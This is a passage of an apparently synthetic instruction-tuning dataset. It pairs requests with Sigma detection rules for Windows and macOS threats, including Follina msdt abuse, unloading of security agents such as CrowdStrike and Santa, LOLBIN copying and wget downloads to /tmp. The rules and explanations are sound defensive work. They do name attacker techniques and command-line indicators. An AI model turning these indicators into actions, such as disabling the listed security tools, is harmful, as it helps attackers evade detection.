      "Sigma": "logsource:\n    product: windows\n    service: bits-client\ndetection:\n    selection:\n        EventID: 16403\n        LocalName|endswith:\n            # TODO: Extend this list with more interesting file extensions\n            - '.bat'\n            - '.dll'\n            - '.exe' # TODO: Might wanna comment this if it generates tons of FPs\n            - '.hta'\n            - '.ps1'\n            - '.psd1'\n            - '.sh'\n            - '.vbe'\n            - '.vbs'\n    filter_optional_generic:\n        # Typical updates: Chrome, Dropbox etc.\n        LocalName|contains: '\\AppData\\'\n        RemoteName|contains: '.com'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - While the file extensions in question can be suspicious at times. It's best to add filters according to your environment to avoid large amount false positives\nlevel: medium\n",
      "question": "new BITS transfer job saving local files with potential suspicious extensions",
      "answer": "In order to detect new BITS transfer job saving local files with potential suspicious extensions, you should: Monitor the Windows Background Intelligent Transfer Service (BITS) for specific behaviors that could indicate malicious activity. Be alert for event ID 16403, which signals the creation of a new BITS transfer job. The focus should be on jobs that save local files with extensions that are commonly associated with malicious scripts and executable files, such as '.bat' (batch files), '.dll' (dynamic link libraries), '.exe' (executables), '.hta' (HTML applications), '.ps1' (PowerShell scripts), '.psd1' (PowerShell module manifests), '.sh' (UNIX shell scripts), '.vbe' (VBScript encoded scripts), and '.vbs' (VBScript files). It is critical to apply filters to exclude known benign transfers, particularly those involving common applications like Chrome or Dropbox, which can be identified through file paths containing '\\AppData\\' or remote names containing '.com'. Implementing such filters will help reduce false positives, acknowledging that while the presence of these file extensions can be suspect, they can also frequently occur in non-malicious contexts. The adjustment of these filters might be necessary to align with the unique characteristics of your operational environment. The detection carries a medium level of urgency, indicating its importance in maintaining a secure network environment while also balancing the need to manage alerts effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of legitimate desktop support and remote access software by adversaries as a method to establish an interactive command and control channel within networks, you should focus on monitoring file events on Windows systems. Specifically, vigilance should be directed towards the creation or modification of configuration files associated with AnyDesk\u2014a popular remote desktop software. These configuration files typically include 'user.conf' and 'system.conf' located in the '\\AppData\\Roaming\\AnyDesk' directory. Additionally, attention should be paid to files ending with the '.temp' extension as they may also indicate suspicious activities related to the misuse of legitimate remote access software. It's important to note that these indicators can occasionally be triggered by legitimate use of AnyDesk or during normal system operations, hence it is classified at a medium level of alertness. The tactics and techniques primarily involved in such activities include Execution, Persistence, Privilege Escalation, and Defense Evasion, commonly seen with remote access tools like VNC, Ammyy, and Teamviewer which are employed by adversaries for command and control operations as part of their attack strategies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains:\n            - '\\AppData\\Roaming\\AnyDesk\\user.conf'\n            - '\\AppData\\Roaming\\AnyDesk\\system.conf'\n        TargetFilename|endswith: '.temp'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains:\n            - '\\AppData\\Roaming\\AnyDesk\\user.conf'\n            - '\\AppData\\Roaming\\AnyDesk\\system.conf'\n        TargetFilename|endswith: '.temp'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "answer": "In order to detect the use of legitimate desktop support and remote access software by adversaries as a method to establish an interactive command and control channel within networks, you should focus on monitoring file events on Windows systems. Specifically, vigilance should be directed towards the creation or modification of configuration files associated with AnyDesk\u2014a popular remote desktop software. These configuration files typically include 'user.conf' and 'system.conf' located in the '\\AppData\\Roaming\\AnyDesk' directory. Additionally, attention should be paid to files ending with the '.temp' extension as they may also indicate suspicious activities related to the misuse of legitimate remote access software. It's important to note that these indicators can occasionally be triggered by legitimate use of AnyDesk or during normal system operations, hence it is classified at a medium level of alertness. The tactics and techniques primarily involved in such activities include Execution, Persistence, Privilege Escalation, and Defense Evasion, commonly seen with remote access tools like VNC, Ammyy, and Teamviewer which are employed by adversaries for command and control operations as part of their attack strategies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability, you should: monitor for the creation of processes on Windows operating systems that involve the \"msdt.exe\" executable. Specifically, look for any process creation events where the image path ends with \"\\msdt.exe\" or where the original file name is identified as \"msdt.exe\". Additionally, scrutinize the command line for specific patterns that indicate exploitation. These patterns include the presence of \"IT_BrowseForFile=\" in the command line, which suggests an in-line command exploitation method, or the use of \"PCWDiagnostic\" in the command line, pointing towards an answer file flag being utilized. Furthermore, detect scenarios where command-line parameters \"/af\" or \"-af\" are used, as these parameters are notably associated with specifying an answer file, a tactic tied to exploiting this vulnerability. Paying attention to these command-line clues is crucial for identifying potential exploitation attempts of the follina vulnerability. Ensure that detection covers any processes matching the image conditions in conjunction with any of the described command-line indications. This approach is high priority due to the severity and potential impact of exploits leveraging this vulnerability.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    selection_cmd_inline:\n        CommandLine|contains: 'IT_BrowseForFile='\n    selection_cmd_answerfile_flag:\n        CommandLine|contains: ' PCWDiagnostic'\n    selection_cmd_answerfile_param:\n        CommandLine|contains:\n            - ' /af '\n            - ' -af '\n    condition: selection_img and (selection_cmd_inline or all of selection_cmd_answerfile_*)\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msdt.exe'\n        - OriginalFileName: 'msdt.exe'\n    selection_cmd_inline:\n        CommandLine|contains: 'IT_BrowseForFile='\n    selection_cmd_answerfile_flag:\n        CommandLine|contains: ' PCWDiagnostic'\n    selection_cmd_answerfile_param:\n        CommandLine|contains:\n            - ' /af '\n            - ' -af '\n    condition: selection_img and (selection_cmd_inline or all of selection_cmd_answerfile_*)\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability",
      "answer": "In order to detect processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability, you should: monitor for the creation of processes on Windows operating systems that involve the \"msdt.exe\" executable. Specifically, look for any process creation events where the image path ends with \"\\msdt.exe\" or where the original file name is identified as \"msdt.exe\". Additionally, scrutinize the command line for specific patterns that indicate exploitation. These patterns include the presence of \"IT_BrowseForFile=\" in the command line, which suggests an in-line command exploitation method, or the use of \"PCWDiagnostic\" in the command line, pointing towards an answer file flag being utilized. Furthermore, detect scenarios where command-line parameters \"/af\" or \"-af\" are used, as these parameters are notably associated with specifying an answer file, a tactic tied to exploiting this vulnerability. Paying attention to these command-line clues is crucial for identifying potential exploitation attempts of the follina vulnerability. Ensure that detection covers any processes matching the image conditions in conjunction with any of the described command-line indications. This approach is high priority due to the severity and potential impact of exploits leveraging this vulnerability."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of Set-ExecutionPolicy to set insecure policies.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of Set-ExecutionPolicy to set insecure policies, you should: Monitor Windows PowerShell script activity for commands that include setting the execution policy to less restrictive modes such as 'Unrestricted', 'Bypass', or 'RemoteSigned'. This monitoring requires that Script Block Logging is enabled on the system. Specifically, check for the use of the 'Set-ExecutionPolicy' cmdlet in conjunction with any of these insecure policy options. However, be aware of legitimate administrative scripts that might use these commands for valid reasons; these should be considered as potential false positives. The focus is on preventing an attacker from lowering PowerShell execution policy settings to execute malicious scripts without restrictions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    cmdlet:\n        ScriptBlockText|contains: 'Set-ExecutionPolicy'\n    option:\n        ScriptBlockText|contains:\n            - 'Unrestricted'\n            - 'bypass'\n            - 'RemoteSigned'\n    filter:\n        # - ParentImage: 'C:\\ProgramData\\chocolatey\\choco.exe' Powershell event id 4104 do not have ParentImage\n        ScriptBlockText|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')\"\n            - \"(New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')\"\n            - '\\AppData\\Roaming\\Code\\'\n    condition: cmdlet and option and not filter\nfalsepositives:\n    - Administrator script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    cmdlet:\n        ScriptBlockText|contains: 'Set-ExecutionPolicy'\n    option:\n        ScriptBlockText|contains:\n            - 'Unrestricted'\n            - 'bypass'\n            - 'RemoteSigned'\n    filter:\n        # - ParentImage: 'C:\\ProgramData\\chocolatey\\choco.exe' Powershell event id 4104 do not have ParentImage\n        ScriptBlockText|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')\"\n            - \"(New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')\"\n            - '\\AppData\\Roaming\\Code\\'\n    condition: cmdlet and option and not filter\nfalsepositives:\n    - Administrator script\nlevel: medium\n",
      "question": "use of Set-ExecutionPolicy to set insecure policies",
      "answer": "In order to detect the use of Set-ExecutionPolicy to set insecure policies, you should: Monitor Windows PowerShell script activity for commands that include setting the execution policy to less restrictive modes such as 'Unrestricted', 'Bypass', or 'RemoteSigned'. This monitoring requires that Script Block Logging is enabled on the system. Specifically, check for the use of the 'Set-ExecutionPolicy' cmdlet in conjunction with any of these insecure policy options. However, be aware of legitimate administrative scripts that might use these commands for valid reasons; these should be considered as potential false positives. The focus is on preventing an attacker from lowering PowerShell execution policy settings to execute malicious scripts without restrictions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling security tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling security tools, you should monitor process creation logs on macOS systems for specific activities that indicate an attempt to undermine system security. This includes lookout for processes initiating from '/bin/launchctl' with command lines containing 'unload', which is a method used to stop certain security services or daemons. The rule targets the unloading of various security-related property list files (.plist) used by macOS services and security applications, such as firewalls, endpoint protection software, and network security tools. The list includes, but is not limited to, Objective-See's Lulu and BlockBlock, Google Santa, Carbon Black defense daemons, Little Snitch, Tenable Nessus agent, OpenDNS Umbrella, Crowdstrike Falcon, Facebook's osquery, as well as several Elastic log shippers (filebeat, auditbeat, packetbeat) and fluentd's td-agent. This targeted unloading represents an attacker's attempt to disable these tools, allowing them to carry out malicious activities without being detected.\n\nAdditionally, monitoring is advised for the '/usr/sbin/spctl' process with command lines containing 'disable', which signals attempts to disable Gatekeeper. Gatekeeper is a macOS security feature that enforces code signing and verifies downloaded applications before allowing them to run, thus disabling it represents a significant security risk.\n\nThese activities should be treated with a medium level of suspicion as they could represent legitimate administrative actions as well. However, in the context of other suspicious activities, they could be indicative of an attack aimed at disabling security tools to facilitate further malicious actions undetected.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: macos\ndetection:\n    launchctl_unload:\n        Image: '/bin/launchctl'\n        CommandLine|contains: 'unload'\n    security_plists:\n        CommandLine|contains:\n            - 'com.objective-see.lulu.plist'                     # Objective-See firewall management utility\n            - 'com.objective-see.blockblock.plist'               # Objective-See persistence locations watcher/blocker\n            - 'com.google.santad.plist'                          # google santa\n            - 'com.carbonblack.defense.daemon.plist'             # carbon black\n            - 'com.carbonblack.daemon.plist'                     # carbon black\n            - 'at.obdev.littlesnitchd.plist'                     # Objective Development Software firewall management utility\n            - 'com.tenablesecurity.nessusagent.plist'            # Tenable Nessus\n            - 'com.opendns.osx.RoamingClientConfigUpdater.plist' # OpenDNS Umbrella\n            - 'com.crowdstrike.falcond.plist'                    # Crowdstrike Falcon\n            - 'com.crowdstrike.userdaemon.plist'                 # Crowdstrike Falcon\n            - 'osquery'                                          # facebook osquery\n            - 'filebeat'                                         # elastic log file shipper\n            - 'auditbeat'                                        # elastic auditing agent/log shipper\n            - 'packetbeat'                                       # elastic network logger/shipper\n            - 'td-agent'                                         # fluentd log shipper\n    disable_gatekeeper:\n        Image: '/usr/sbin/spctl'\n        CommandLine|contains: 'disable'\n    condition: (launchctl_unload and security_plists) or disable_gatekeeper\nfalsepositives:\n    - Legitimate activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: macos\ndetection:\n    launchctl_unload:\n        Image: '/bin/launchctl'\n        CommandLine|contains: 'unload'\n    security_plists:\n        CommandLine|contains:\n            - 'com.objective-see.lulu.plist'                     # Objective-See firewall management utility\n            - 'com.objective-see.blockblock.plist'               # Objective-See persistence locations watcher/blocker\n            - 'com.google.santad.plist'                          # google santa\n            - 'com.carbonblack.defense.daemon.plist'             # carbon black\n            - 'com.carbonblack.daemon.plist'                     # carbon black\n            - 'at.obdev.littlesnitchd.plist'                     # Objective Development Software firewall management utility\n            - 'com.tenablesecurity.nessusagent.plist'            # Tenable Nessus\n            - 'com.opendns.osx.RoamingClientConfigUpdater.plist' # OpenDNS Umbrella\n            - 'com.crowdstrike.falcond.plist'                    # Crowdstrike Falcon\n            - 'com.crowdstrike.userdaemon.plist'                 # Crowdstrike Falcon\n            - 'osquery'                                          # facebook osquery\n            - 'filebeat'                                         # elastic log file shipper\n            - 'auditbeat'                                        # elastic auditing agent/log shipper\n            - 'packetbeat'                                       # elastic network logger/shipper\n            - 'td-agent'                                         # fluentd log shipper\n    disable_gatekeeper:\n        Image: '/usr/sbin/spctl'\n        CommandLine|contains: 'disable'\n    condition: (launchctl_unload and security_plists) or disable_gatekeeper\nfalsepositives:\n    - Legitimate activities\nlevel: medium\n",
      "question": "disabling security tools",
      "answer": "In order to detect disabling security tools, you should monitor process creation logs on macOS systems for specific activities that indicate an attempt to undermine system security. This includes lookout for processes initiating from '/bin/launchctl' with command lines containing 'unload', which is a method used to stop certain security services or daemons. The rule targets the unloading of various security-related property list files (.plist) used by macOS services and security applications, such as firewalls, endpoint protection software, and network security tools. The list includes, but is not limited to, Objective-See's Lulu and BlockBlock, Google Santa, Carbon Black defense daemons, Little Snitch, Tenable Nessus agent, OpenDNS Umbrella, Crowdstrike Falcon, Facebook's osquery, as well as several Elastic log shippers (filebeat, auditbeat, packetbeat) and fluentd's td-agent. This targeted unloading represents an attacker's attempt to disable these tools, allowing them to carry out malicious activities without being detected.\n\nAdditionally, monitoring is advised for the '/usr/sbin/spctl' process with command lines containing 'disable', which signals attempts to disable Gatekeeper. Gatekeeper is a macOS security feature that enforces code signing and verifies downloaded applications before allowing them to run, thus disabling it represents a significant security risk.\n\nThese activities should be treated with a medium level of suspicion as they could represent legitimate administrative actions as well. However, in the context of other suspicious activities, they could be indicative of an attack aimed at disabling security tools to facilitate further malicious actions undetected."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk, often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations, you should monitor for process creation events in Windows environments, specifically focusing on instances where command-line tools like cmd.exe, PowerShell (powershell.exe or pwsh.exe), robocopy.exe, or xcopy.exe are invoked. These tools should be scrutinized when they include commands indicative of a file copy operation (e.g., \"copy \", \"copy-item\", \"cpi \", \"cp \") especially when the target or destination of the copy involves critical system directories like System32 or SysWOW64. It's important to pay particular attention to the command line used in these operations, recording both the command issued and, if available, the parent command line that initiated the process. However, it's also necessary to be aware of legitimate administrative scripts and direct calls to copying utilities that may trigger false positives, so the context of each detection must be evaluated against known benign activities in the monitored environment. This methodology is designed to uncover tactics and techniques potentially indicative of attempts to evade simple path-based detection mechanisms by relocating system tools to less scrutinized directories.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n            - '\\robocopy.exe'\n            - '\\xcopy.exe'\n        - OriginalFileName:\n            - 'robocopy.exe'\n            - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n    condition: 1 of selection* and target\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n            - '\\robocopy.exe'\n            - '\\xcopy.exe'\n        - OriginalFileName:\n            - 'robocopy.exe'\n            - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n    condition: 1 of selection* and target\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n",
      "question": "suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations\n",
      "answer": "In order to detect a suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk, often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations, you should monitor for process creation events in Windows environments, specifically focusing on instances where command-line tools like cmd.exe, PowerShell (powershell.exe or pwsh.exe), robocopy.exe, or xcopy.exe are invoked. These tools should be scrutinized when they include commands indicative of a file copy operation (e.g., \"copy \", \"copy-item\", \"cpi \", \"cp \") especially when the target or destination of the copy involves critical system directories like System32 or SysWOW64. It's important to pay particular attention to the command line used in these operations, recording both the command issued and, if available, the parent command line that initiated the process. However, it's also necessary to be aware of legitimate administrative scripts and direct calls to copying utilities that may trigger false positives, so the context of each detection must be evaluated against known benign activities in the monitored environment. This methodology is designed to uncover tactics and techniques potentially indicative of attempts to evade simple path-based detection mechanisms by relocating system tools to less scrutinized directories."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting The \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) can be used to execute arbitrary binaries.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect malicious use of the \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) to execute arbitrary binaries, you should monitor process creation logs on Windows systems. Focus on spotting any instances where the process image or its original filename ends with '\\mftrace.exe'. Additionally, observe command lines that either contain '.exe ' (indicating an executable being specified after a space) or end with '.exe' as these patterns suggest the launching of an executable file. It's also crucial to watch for any parent processes with an image name ending in '\\mftrace.exe', indicating mftrace.exe may be used to initiate other executables. Always consider the potential for legitimate use of mftrace.exe for tracing purposes, as these instances can be false positives. This approach is characterized by a medium level of alertness and targets the identification of techniques and tactics like Execution, Command and Scripting Interpreter, and Execution through API, helping to safeguard against the exploitation of mftrace.exe for executing unauthorized binaries.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mftrace.exe'\n        - OriginalFileName: 'mftrace.exe'\n    selection_cli:\n        # This assumes that when someone use mftrace to launch an \".exe\" he will add a space and the binary launched will end with \".exe\"\n        CommandLine|contains: '.exe '\n        CommandLine|endswith: '.exe'\n    parent:\n        ParentImage|endswith: '\\mftrace.exe'\n    condition: all of selection* or parent\nfalsepositives:\n    - Legitimate use for tracing purposes\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mftrace.exe'\n        - OriginalFileName: 'mftrace.exe'\n    selection_cli:\n        # This assumes that when someone use mftrace to launch an \".exe\" he will add a space and the binary launched will end with \".exe\"\n        CommandLine|contains: '.exe '\n        CommandLine|endswith: '.exe'\n    parent:\n        ParentImage|endswith: '\\mftrace.exe'\n    condition: all of selection* or parent\nfalsepositives:\n    - Legitimate use for tracing purposes\nlevel: medium\n",
      "question": "The \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) can be used to execute arbitrary binaries",
      "answer": "In order to detect malicious use of the \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) to execute arbitrary binaries, you should monitor process creation logs on Windows systems. Focus on spotting any instances where the process image or its original filename ends with '\\mftrace.exe'. Additionally, observe command lines that either contain '.exe ' (indicating an executable being specified after a space) or end with '.exe' as these patterns suggest the launching of an executable file. It's also crucial to watch for any parent processes with an image name ending in '\\mftrace.exe', indicating mftrace.exe may be used to initiate other executables. Always consider the potential for legitimate use of mftrace.exe for tracing purposes, as these instances can be false positives. This approach is characterized by a medium level of alertness and targets the identification of techniques and tactics like Execution, Command and Scripting Interpreter, and Execution through API, helping to safeguard against the exploitation of mftrace.exe for executing unauthorized binaries."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify the use of various commands to query a system's time, which may be indicative of an adversary attempting to understand the time zone or system time before executing scheduled tasks, you should monitor process creation logs on Windows systems for the execution of specific commands. Look for processes being created that end with \\net.exe or \\net1.exe which include the use of the word 'time' in their command line. Additionally, watch for processes ending in \\w32tm.exe that include 'tz' in their command line, as this can indicate an attempt to query the system's time zone. Be aware, however, that these system utilities might be used for legitimate reasons, such as discovering system time for authorized activities, which could result in false positives. The severity of this detection is considered low, but it is tied to the broader tactics and techniques of gathering reconnaissance information on a target system to facilitate other forms of attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_time:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n    selection_w32tm:\n        Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_time:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n    selection_w32tm:\n        Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: low\n",
      "question": "Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.",
      "answer": "In order to identify the use of various commands to query a system's time, which may be indicative of an adversary attempting to understand the time zone or system time before executing scheduled tasks, you should monitor process creation logs on Windows systems for the execution of specific commands. Look for processes being created that end with \\net.exe or \\net1.exe which include the use of the word 'time' in their command line. Additionally, watch for processes ending in \\w32tm.exe that include 'tz' in their command line, as this can indicate an attempt to query the system's time zone. Be aware, however, that these system utilities might be used for legitimate reasons, such as discovering system time for authorized activities, which could result in false positives. The severity of this detection is considered low, but it is tied to the broader tactics and techniques of gathering reconnaissance information on a target system to facilitate other forms of attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of CleanWipe a tool usually used to delete Symantec antivirus..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of CleanWipe, a tool usually used to delete Symantec antivirus, you should: Monitor Windows process creation logs for the execution of specific executables that are commonly associated with this tool. Specifically, look for processes ending in '\\SepRemovalToolNative_x64.exe', '\\CATClean.exe' with the command line containing '--uninstall', '\\NetInstaller.exe' with '-r' in the command line, and '\\WFPUnins.exe' with both '/uninstall' and '/enterprise' in the command line arguments. Any instance of these being executed could indicate an attempt to remove Symantec's antivirus products, potentially as a precursor to an attack. It's important to consider that while these indicators can be a sign of malicious activity, they might also occur during legitimate administrative actions and should be investigated to determine the context. The detection of this activity is considered high priority due to the potential security implications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\SepRemovalToolNative_x64.exe'\n    selection2:\n        Image|endswith: '\\CATClean.exe'\n        CommandLine|contains: '--uninstall'\n    selection3:\n        Image|endswith: '\\NetInstaller.exe'\n        CommandLine|contains: '-r'\n    selection4:\n        Image|endswith: '\\WFPUnins.exe'\n        CommandLine|contains|all:\n            - '/uninstall'\n            - '/enterprise'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administrative use (Should be investigated either way)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith: '\\SepRemovalToolNative_x64.exe'\n    selection2:\n        Image|endswith: '\\CATClean.exe'\n        CommandLine|contains: '--uninstall'\n    selection3:\n        Image|endswith: '\\NetInstaller.exe'\n        CommandLine|contains: '-r'\n    selection4:\n        Image|endswith: '\\WFPUnins.exe'\n        CommandLine|contains|all:\n            - '/uninstall'\n            - '/enterprise'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administrative use (Should be investigated either way)\nlevel: high\n",
      "question": "use of CleanWipe a tool usually used to delete Symantec antivirus.",
      "answer": "In order to detect the use of CleanWipe, a tool usually used to delete Symantec antivirus, you should: Monitor Windows process creation logs for the execution of specific executables that are commonly associated with this tool. Specifically, look for processes ending in '\\SepRemovalToolNative_x64.exe', '\\CATClean.exe' with the command line containing '--uninstall', '\\NetInstaller.exe' with '-r' in the command line, and '\\WFPUnins.exe' with both '/uninstall' and '/enterprise' in the command line arguments. Any instance of these being executed could indicate an attempt to remove Symantec's antivirus products, potentially as a precursor to an attack. It's important to consider that while these indicators can be a sign of malicious activity, they might also occur during legitimate administrative actions and should be investigated to determine the context. The detection of this activity is considered high priority due to the potential security implications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\", you should: Monitor Linux file events for instances where the application 'wget' is used to download files, specifically when these files are being saved into temporary directories like \"/tmp\" or \"/var/tmp\". It is important to note that there could be legitimate reasons for files to be downloaded into these directories, and such instances should be considered as potential false positives. The detection process relies on identifying events where the command or process name ends with '/wget' and the target filenames start with '/tmp/' or '/var/tmp/'. This monitoring activity is of a medium priority level and targets tactics and techniques related to the execution and defense evasion, which are indicated by the utilization of 'wget' for the purpose of dropping files into directories that are commonly used for temporary storage but could also be employed for malicious activities.",
    "context": "",
